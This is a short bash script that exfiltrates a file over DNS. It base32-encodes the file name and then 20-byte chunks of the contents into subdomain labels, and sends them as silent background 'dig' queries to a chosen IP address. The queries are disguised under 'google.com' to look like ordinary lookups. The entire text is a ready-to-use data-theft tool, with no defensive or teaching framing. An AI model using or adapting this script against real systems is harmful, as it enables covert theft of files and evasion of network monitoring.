#!/bin/bash

main () {
    ip=$1
    file=$2
    base_domain="google.com"

    # Check if the file exists
    if [ ! -f "$file" ]; then
        echo "File does not exist: $file"
        exit 1
    fi

    # Get the size of the file
    file_size=$(stat -c %s "$file")
    chunk_size=20

    # Calculate the number of chunks
    if [ $(($file_size % $chunk_size)) -eq 0 ]; then
        num_chunks=$(($file_size / $chunk_size))
    else
        num_chunks=$(($file_size / $chunk_size + 1))
    fi

    encoded_file_name=$(echo -n "$file" | base32 | sed -r 's/=//g') 
    dig_req="0.${num_chunks}.${encoded_file_name,,}.${base_domain}"
    send_query $ip $dig_req
    # dig @${ip} $dig_req >/dev/null 2>&1 &

    # Process the file in blocks
    count=1
    while IFS= read -r -d '' -n $chunk_size block; do
    encoded_chunk=$(echo -n "$block" | base32)
    dig_req="${count}.${num_chunks}.${encoded_chunk,,}.${base_domain}"
    send_query $ip $dig_req
    count=$((count+1))
    done < "$file"

    if [ $(($file_size % $chunk_size)) -ne 0 ]; then
    encoded_chunk=$(tail -c $(($file_size % $chunk_size)) "$file" | base32 | sed -r 's/=//g')
    dig_req="${count}.${num_chunks}.${encoded_chunk,,}.${base_domain}"
    send_query $ip $dig_req
    fi
}

send_query() {
    dig @$1 $2 +tries=1 +time=2 > /dev/null 2>&1 &
}

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <ip> <file>"
    exit 1
fi

file="$2"
ip="$1"

main $ip $file
